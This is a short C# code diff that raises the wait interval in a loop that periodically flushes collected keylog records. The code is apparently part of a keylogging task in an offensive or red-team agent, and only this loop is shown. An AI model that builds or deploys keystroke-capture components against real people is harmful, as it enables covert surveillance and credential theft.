@@ -64,7 +64,7 @@ namespace Tasks
                 WaitHandle[] waiters = new WaitHandle[] { _cancellationToken.Token.WaitHandle, _complete };
                 while (!_cancellationToken.IsCancellationRequested && !_completed)
                 {
-                    WaitHandle.WaitAny(waiters, 1000);
+                    WaitHandle.WaitAny(waiters, 10000);
                     KeylogInformation[] keylogs = _keylogs.Flush();
                     if (keylogs.Length > 0)
                     {
